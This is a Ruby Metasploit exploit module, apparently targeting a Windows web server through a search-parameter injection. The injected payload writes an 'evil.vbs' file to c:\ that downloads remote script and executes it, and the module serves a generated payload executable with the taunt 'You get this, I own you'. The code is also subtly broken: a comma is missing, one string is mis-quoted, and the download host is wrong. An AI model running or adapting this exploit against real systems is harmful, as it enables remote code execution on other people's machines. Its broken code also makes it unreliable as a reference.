##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HttpClient and HttpServer Example",
      'Description'    => %q{
        This demonstrates how to use two mixins (HttpClient and HttpServer) at the same time,
        but this allows the HttpServer to terminate after a delay.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'mfadzilr' ],
      'References'     =>
        [
          ['URL', 'http://metasploit.com']
        ],
      'Payload'        => { 'BadChars' => "\x00" },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
        ],
      'CmdStagerFlavor' => 'vbs'
      'Privileged'     => false,
      'DisclosureDate' => "Sep 14 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The path to some web application', '/']),
          OptInt.new('HTTPDELAY',    [false, 'Number of seconds the web server will wait before termination', 10])
        ], self.class)
  end

  def on_request_uri(cli, req)
    print_status("#{peer} - Payload request received: #{req.uri}")
    exe = generate_payload_exe
    send_response(cli, exe, 'You get this, I own you')
  end

  def primer
    uri = target_uri.path
    fname = "evil.vbs"
    save_path = "c:\\" + fname
    vbs_evil = "Set x=CreateObject(\x22Microsoft.XMLHTTP\x22)\x0d\x0ax.Open \x22GET\x22,\x22http://#{RHOST}/#{fname}\x22,False\x0d\x0ax.Send\x0d\x0aExecute x.responseText"
    exec_save = "%00{.save|save_path|#{vbs_evil}.}"
    print_status("Sending a malicious request to #{target_uri.path}")
    #send_request_cgi({'uri'=>normalize_uri(target_uri.path)})
    send_request_cgi({
      'method' => 'GET',
      'uri'    => 'normalize_uri(uri,'?search=' + exec_save),
    })
  end

  def exploit
    begin
      Timeout.timeout(datastore['HTTPDELAY']) { super }
      rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
    end
  end
end
